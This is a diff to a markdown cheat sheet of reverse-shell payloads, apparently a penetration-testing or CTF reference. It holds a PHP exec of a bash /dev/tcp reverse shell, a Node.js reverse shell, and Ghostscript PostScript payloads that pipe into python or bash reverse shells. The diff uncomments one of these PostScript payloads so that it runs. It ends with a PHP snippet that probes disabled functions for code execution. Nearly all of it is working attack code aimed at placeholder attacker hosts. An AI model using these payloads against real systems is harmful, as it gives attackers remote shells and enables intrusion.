@@ -1,11 +1,11 @@
-## Reverse shells
-### PHP Reverse Shell
+# Reverse shells
+## PHP Reverse Shell
 ```php
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
 ```
 
-### Javascript Reverse Shell
+## Javascript Reverse Shell
 ```js
 var spawn = require('child_process').spawn;
 var net = require('net');
@@ -20,7 +20,7 @@ reconnect(function (stream) {
 }).connect(<port>, '<ip>');
 ```
 
-### Postscript Reverse Shell
+## Postscript Reverse Shell
 ```ps
 %!PS
 userdict /setpagedevice undef
@@ -32,14 +32,14 @@ mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(s
 
 ```ps
 %!PS
-%%userdict /setpagedevice undef
-%%legal
-%%{ null restore } stopped { pop } if
-%%legal
-%%mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1') currentdevice putdeviceprops
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1') currentdevice putdeviceprops
 ```
 
-### PHP RCE
+## PHP RCE
 ```php
 <?php var_dump(explode('.'.ini_get('disable_functions')));?>
 ```
